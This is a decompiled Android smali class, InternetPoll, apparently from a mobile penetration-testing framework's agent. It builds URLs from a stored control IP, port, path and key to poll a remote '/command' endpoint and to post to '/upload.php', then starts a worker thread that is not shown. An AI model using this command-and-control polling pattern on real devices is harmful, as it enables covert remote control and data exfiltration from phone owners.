.class public Lcom/bulbsecurity/framework/app/InternetPoll;
.super Landroid/app/Service;
.source "InternetPoll.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 22
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 120
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 0

    .prologue
    .line 29
    return-void
.end method

.method public onDestroy()V
    .locals 0

    .prologue
    .line 125
    return-void
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 17
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "startID"    # I

    .prologue
    .line 33
    invoke-virtual/range {p0 .. p0}, Lcom/bulbsecurity/framework/app/InternetPoll;->getApplication()Landroid/app/Application;

    move-result-object v15

    check-cast v15, Lcom/bulbsecurity/framework/app/FrameworkAndroidApp;

    invoke-virtual {v15}, Lcom/bulbsecurity/framework/app/FrameworkAndroidApp;->getstop()I

    move-result v4

    .line 35
    .local v4, "off":I
    if-nez v4, :cond_2

    .line 37
    const-string v15, "AAA"

    const-string v16, "Started Internetpoll"

    invoke-static/range {v15 .. v16}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 39
    const-string v2, "http://"

    .line 40
    .local v2, "http":Ljava/lang/String;
    invoke-virtual/range {p0 .. p0}, Lcom/bulbsecurity/framework/app/InternetPoll;->getApplication()Landroid/app/Application;

    move-result-object v15

    check-cast v15, Lcom/bulbsecurity/framework/app/FrameworkAndroidApp;

    invoke-virtual {v15}, Lcom/bulbsecurity/framework/app/FrameworkAndroidApp;->getcontrolIP()Ljava/lang/String;

    move-result-object v1

    .line 41
    .local v1, "controlIP":Ljava/lang/String;
    invoke-virtual/range {p0 .. p0}, Lcom/bulbsecurity/framework/app/InternetPoll;->getApplication()Landroid/app/Application;

    move-result-object v15

    check-cast v15, Lcom/bulbsecurity/framework/app/FrameworkAndroidApp;

    invoke-virtual {v15}, Lcom/bulbsecurity/framework/app/FrameworkAndroidApp;->getpath()Ljava/lang/String;

    move-result-object v5

    .line 42
    .local v5, "path":Ljava/lang/String;
    invoke-virtual/range {p0 .. p0}, Lcom/bulbsecurity/framework/app/InternetPoll;->getApplication()Landroid/app/Application;

    move-result-object v15

    check-cast v15, Lcom/bulbsecurity/framework/app/FrameworkAndroidApp;

    invoke-virtual {v15}, Lcom/bulbsecurity/framework/app/FrameworkAndroidApp;->getport()Ljava/lang/String;

    move-result-object v6

    .line 43
    .local v6, "port":Ljava/lang/String;
    const-string v13, "/command"

    .line 44
    .local v13, "urii":Ljava/lang/String;
    invoke-virtual {v2, v1}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    .line 45
    .local v10, "uri":Ljava/lang/String;
    const-string v15, "80"

    invoke-virtual {v6, v15}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v15

    if-nez v15, :cond_0

    .line 47
    const-string v15, ":"

    invoke-virtual {v10, v15}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v15, v6}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    .line 49
    :cond_0
    invoke-virtual {v10, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    .line 50
    .local v11, "uri2":Ljava/lang/String;
    invoke-virtual {v11, v13}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 51
    .local v9, "pullfrom":Ljava/lang/String;
    invoke-virtual/range {p0 .. p0}, Lcom/bulbsecurity/framework/app/InternetPoll;->getApplication()Landroid/app/Application;

    move-result-object v15

    check-cast v15, Lcom/bulbsecurity/framework/app/FrameworkAndroidApp;

    invoke-virtual {v15}, Lcom/bulbsecurity/framework/app/FrameworkAndroidApp;->getkey()Ljava/lang/String;

    move-result-object v3

    .line 52
    .local v3, "key":Ljava/lang/String;
    const-string v14, "/upload.php"

    .line 53
    .local v14, "url2":Ljava/lang/String;
    invoke-virtual {v2, v1}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    .line 54
    .local v12, "uri3":Ljava/lang/String;
    const-string v15, "80"

    invoke-virtual {v6, v15}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v15

    if-nez v15, :cond_1

    .line 56
    const-string v15, ":"

    invoke-virtual {v12, v15}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v15, v6}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    .line 58
    :cond_1
    invoke-virtual {v12, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 59
    .local v8, "postto1":Ljava/lang/String;
    invoke-virtual {v8, v14}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 60
    .local v7, "postto":Ljava/lang/String;
    const-string v15, "pullfrom"

    invoke-static {v15, v9}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 61
    const-string v15, "postto"

    invoke-static {v15, v7}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 62
    new-instance v15, Lcom/bulbsecurity/framework/app/InternetPoll$1;

    move-object/from16 v0, p0

    invoke-direct {v15, v0, v9, v3, v7}, Lcom/bulbsecurity/framework/app/InternetPoll$1;-><init>(Lcom/bulbsecurity/framework/app/InternetPoll;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 112
    invoke-virtual {v15}, Lcom/bulbsecurity/framework/app/InternetPoll$1;->start()V

    .line 115
    .end local v1    # "controlIP":Ljava/lang/String;
    .end local v2    # "http":Ljava/lang/String;
    .end local v3    # "key":Ljava/lang/String;
    .end local v5    # "path":Ljava/lang/String;
    .end local v6    # "port":Ljava/lang/String;
    .end local v7    # "postto":Ljava/lang/String;
    .end local v8    # "postto1":Ljava/lang/String;
    .end local v9    # "pullfrom":Ljava/lang/String;
    .end local v10    # "uri":Ljava/lang/String;
    .end local v11    # "uri2":Ljava/lang/String;
    .end local v12    # "uri3":Ljava/lang/String;
    .end local v13    # "urii":Ljava/lang/String;
    .end local v14    # "url2":Ljava/lang/String;
    :cond_2
    return-void
.end method
